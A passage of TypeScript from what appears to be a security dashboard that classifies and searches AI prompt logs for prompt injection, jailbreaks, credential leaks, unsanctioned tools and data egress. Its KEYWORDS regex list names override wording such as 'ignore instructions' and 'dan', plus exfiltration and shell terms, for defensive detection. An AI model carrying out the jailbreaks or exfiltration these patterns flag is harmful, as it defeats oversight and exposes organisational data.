    .filter((d) => d.ts <= ANCHOR)
    .sort((a, b) => a.ts - b.ts)
    .map((d) => build(d, r));
  return cache;
}

// ---------------------------------------------------------------- violation taxonomy

export type ViolationCategory =
  | "prompt_injection" | "jailbreak" | "data_leakage" | "credential_exposure" | "payment_card_exposure"
  | "unsanctioned_mcp" | "unauthorized_skill" | "shadow_model" | "unregistered_app"
  | "data_egress" | "malicious_uri" | "rai_violation" | "restricted_dataset";

export const CATEGORY_LABEL: Record<ViolationCategory, string> = {
  prompt_injection: "Indirect prompt injection",
  jailbreak: "Jailbreak / policy evasion",
  data_leakage: "Sensitive data in prompt or response",
  credential_exposure: "Credential or key exposure",
  payment_card_exposure: "Payment card data",
  unsanctioned_mcp: "Unsanctioned MCP server",
  unauthorized_skill: "Unauthorized skill use",
  shadow_model: "Unapproved model",
  unregistered_app: "Unregistered application",
  data_egress: "Egress to non-corporate destination",
  malicious_uri: "Malicious URI",
  rai_violation: "Responsible-AI violation",
  restricted_dataset: "Restricted dataset access",
};

const CREDENTIAL_TYPES = ["GCP_SERVICE_ACCOUNT_KEY", "GCP_API_KEY", "PASSWORD", "PRIVATE_KEY_PEM", "AUTH_TOKEN"];
const INTERNAL = [ORG_DOMAIN, ...new Set(Object.values(SANCTIONED_MCP))];

export function isExternalDestination(dest: string): boolean {
  return !INTERNAL.some((d) => dest.includes(d)) || PERSONAL_EMAIL_DOMAINS.some((d) => dest.includes(d) && dest.includes("personal"));
}

export function classify(log: PromptLog): ViolationCategory[] {
  const out = new Set<ViolationCategory>();
  const policy = APPS[log.app];

  if (log.filters.pi_jailbreak) out.add(log.contentRole === "user_prompt" ? "jailbreak" : "prompt_injection");
  if (log.filters.malicious_uris) out.add("malicious_uri");
  if (log.filters.rai) out.add("rai_violation");
  for (const f of log.filters.sdp?.findings ?? []) {
    out.add("data_leakage");
    if (CREDENTIAL_TYPES.includes(f.infoType)) out.add("credential_exposure");
    if (f.infoType === "CREDIT_CARD_NUMBER") out.add("payment_card_exposure");
  }
  if (log.app === "unregistered") out.add("unregistered_app");
  if (!APPROVED_MODELS.includes(log.model)) out.add("shadow_model");

  for (const t of log.toolCalls ?? []) {
    if (t.kind === "mcp" && t.server && !policy.mcpAllow.includes(t.server)) out.add("unsanctioned_mcp");
    if (t.kind === "skill" && !policy.skillAllow.includes(t.name)) out.add("unauthorized_skill");
    if (t.kind === "function" && !policy.skillAllow.includes(t.name)) out.add("unauthorized_skill");
    if (t.destination && t.bytes && isExternalDestination(t.destination)) out.add("data_egress");
    if (t.args.includes("payroll_detail") || t.args.includes("restricted")) out.add("restricted_dataset");
  }
  if ((log.filters.sdp?.findings ?? []).some((f) => f.infoType === "US_SOCIAL_SECURITY_NUMBER")) out.add("restricted_dataset");

  return [...out];
}

// Natural-language hunts need to reach the taxonomy. These keywords map analyst wording onto
// categories; a predefined hunt ships with its categories already set, so this is for free text.
const KEYWORDS: [RegExp, ViolationCategory[]][] = [
  [/inject|poison|hijack|indirect|untrusted content/i, ["prompt_injection"]],
  [/jailbreak|evasion|evade|bypass|ignore instructions|dan\b/i, ["jailbreak"]],
  [/leak|leakage|pii|sensitive|personal data|customer data|dlp|sdp/i, ["data_leakage"]],
  [/credential|secret|api key|service account|password|token|private key/i, ["credential_exposure"]],
  [/card|pci|payment/i, ["payment_card_exposure"]],
  [/mcp|server|shadow mcp|tool server/i, ["unsanctioned_mcp"]],
  [/skill|unauthorized tool|shell/i, ["unauthorized_skill"]],
  [/shadow ai|unapproved model|unsanctioned model|byo|openai|gpt|llama|mistral/i, ["shadow_model"]],
  [/unregistered|ungoverned|unknown app/i, ["unregistered_app"]],
  [/exfil|egress|outbound|upload|personal email|external destination/i, ["data_egress"]],
  [/malicious|phish|bad url|suspicious link/i, ["malicious_uri"]],
  [/harass|hate|abuse|toxic|responsible ai|rai/i, ["rai_violation"]],
  [/payroll|restricted dataset|ssn|social security|compensation/i, ["restricted_dataset"]],
];

export function categoriesFromText(text: string): ViolationCategory[] {
  const out = new Set<ViolationCategory>();
  for (const [re, cats] of KEYWORDS) if (re.test(text)) cats.forEach((c) => out.add(c));
  return [...out];
}

// ---------------------------------------------------------------- search

export type LogQuery = {
  text?: string;
  categories?: ViolationCategory[];
  apps?: string[];
  principals?: string[];
  filters?: FilterKey[];
  blockedOnly?: boolean;
  matchedOnly?: boolean;
  daysBack?: number;
  limit?: number;
};

const haystack = (l: PromptLog) =>
  [l.principal, l.dept, l.app, l.model, l.client, l.sessionId, l.content, l.geo, l.sourceIp,
    ...(l.toolCalls ?? []).flatMap((t) => [t.name, t.server ?? "", t.destination ?? "", t.args]),
    ...(l.filters.sdp?.findings ?? []).map((f) => f.infoType),
    ...(l.filters.malicious_uris?.uris ?? []),
    ...(l.filters.rai?.categories ?? []).map((c) => c.type),
    l.filters.pi_jailbreak ? "prompt_injection jailbreak" : "",
  ].join(" ").toLowerCase();

export function searchLogs(q: LogQuery): PromptLog[] {
  const logs = allLogs();
  const since = q.daysBack ? ANCHOR - q.daysBack * 86_400_000 : 0;
  const words = (q.text ?? "").toLowerCase().split(/\s+/).filter((w) => w.length > 2);

  return logs.filter((l) => {
    if (Date.parse(l.timestamp) < since) return false;
    if (q.matchedOnly && l.filterMatchState !== "MATCH_FOUND") return false;
    if (q.blockedOnly && !l.blocked) return false;
    if (q.apps?.length && !q.apps.includes(l.app)) return false;
    if (q.principals?.length && !q.principals.some((p) => l.principal.includes(p))) return false;
    if (q.filters?.length && !q.filters.some((f) => f in l.filters)) return false;
    if (q.categories?.length) {
      const cats = classify(l);
      if (!q.categories.some((c) => cats.includes(c))) return false;
    }
    if (words.length) {
      const h = haystack(l);
      if (!words.some((w) => h.includes(w))) return false;
    }
    return true;
  });
}

// ---------------------------------------------------------------- aggregates

export type Bucket = { label: string; value: number; sub?: string };
export type ArmorStats = {
  total: number; matched: number; blocked: number; unblockedMatches: number;
  sessions: number; principals: number; apps: number;
  byCategory: Bucket[]; byApp: Bucket[]; byPrincipal: Bucket[]; byFilter: Bucket[]; byInfoType: Bucket[];
  unsanctionedMcp: Bucket[]; shadowModels: Bucket[]; egress: { destination: string; bytes: number; calls: number; principal: string }[];
  timeline: { date: string; total: number; matched: number; blocked: number }[];
  offHours: number;
};

const tally = (xs: string[]): Bucket[] => {
  const m = new Map<string, number>();
  for (const x of xs) m.set(x, (m.get(x) ?? 0) + 1);
  return [...m].sort((a, b) => b[1] - a[1]).map(([label, value]) => ({ label, value }));
};

export function statsFor(logs: PromptLog[]): ArmorStats {
  const matched = logs.filter((l) => l.filterMatchState === "MATCH_FOUND");
  const cats: string[] = [];
  const infoTypes: string[] = [];
  const mcp: string[] = [];
  const models: string[] = [];
  const egressMap = new Map<string, { destination: string; bytes: number; calls: number; principal: string }>();

  for (const l of matched) cats.push(...classify(l).map((c) => CATEGORY_LABEL[c]));
  for (const l of logs) {
    for (const f of l.filters.sdp?.findings ?? []) infoTypes.push(f.infoType);
    if (!APPROVED_MODELS.includes(l.model)) models.push(l.model);
    for (const t of l.toolCalls ?? []) {
      if (t.kind === "mcp" && t.server && !APPS[l.app].mcpAllow.includes(t.server)) mcp.push(t.server);
      if (t.destination && t.bytes && isExternalDestination(t.destination)) {
        const e = egressMap.get(t.destination) ?? { destination: t.destination, bytes: 0, calls: 0, principal: l.principal };
        e.bytes += t.bytes; e.calls += 1;
        egressMap.set(t.destination, e);
      }
    }
  }

  const days = new Map<string, { total: number; matched: number; blocked: number }>();
  for (const l of logs) {
    const d = l.timestamp.slice(0, 10);
    const b = days.get(d) ?? { total: 0, matched: 0, blocked: 0 };
    b.total++;
    if (l.filterMatchState === "MATCH_FOUND") b.matched++;
    if (l.blocked) b.blocked++;
    days.set(d, b);
  }

  const filterNames = logs.flatMap((l) => Object.keys(l.filters));
  const FILTER_LABEL: Record<string, string> = { pi_jailbreak: "Prompt injection & jailbreak", sdp: "Sensitive Data Protection", malicious_uris: "Malicious URIs", rai: "Responsible AI" };

  return {
    total: logs.length,
    matched: matched.length,
    blocked: logs.filter((l) => l.blocked).length,
    unblockedMatches: matched.filter((l) => !l.blocked).length,
    sessions: new Set(logs.map((l) => l.sessionId)).size,
    principals: new Set(logs.map((l) => l.principal)).size,
    apps: new Set(logs.map((l) => l.app)).size,
    byCategory: tally(cats),
    byApp: tally(logs.map((l) => APPS[l.app].name)),
    byPrincipal: tally(matched.map((l) => l.principal)).slice(0, 10),
    byFilter: tally(filterNames).map((b) => ({ ...b, label: FILTER_LABEL[b.label] ?? b.label })),
    byInfoType: tally(infoTypes),
    unsanctionedMcp: tally(mcp),
    shadowModels: tally(models),
    egress: [...egressMap.values()].sort((a, b) => b.bytes - a.bytes),
    timeline: [...days].sort().map(([date, v]) => ({ date, ...v })),
    offHours: logs.filter((l) => {
      const h = new Date(l.timestamp).getUTCHours();
      return h < 6 || h >= 20;
    }).length,
  };
}

// A compact, model-friendly sample: every matched record first (they are the evidence), then a
// little benign context, capped so a hunt prompt stays affordable.
export function sampleForModel(logs: PromptLog[], limit = 60): PromptLog[] {
  const matched = logs.filter((l) => l.filterMatchState === "MATCH_FOUND");
  const rest = logs.filter((l) => l.filterMatchState !== "MATCH_FOUND");
  const step = Math.max(1, Math.floor(rest.length / Math.max(1, limit - matched.length)));
  return [...matched.slice(0, limit), ...rest.filter((_, i) => i % step === 0).slice(0, Math.max(0, limit - matched.length))];
}
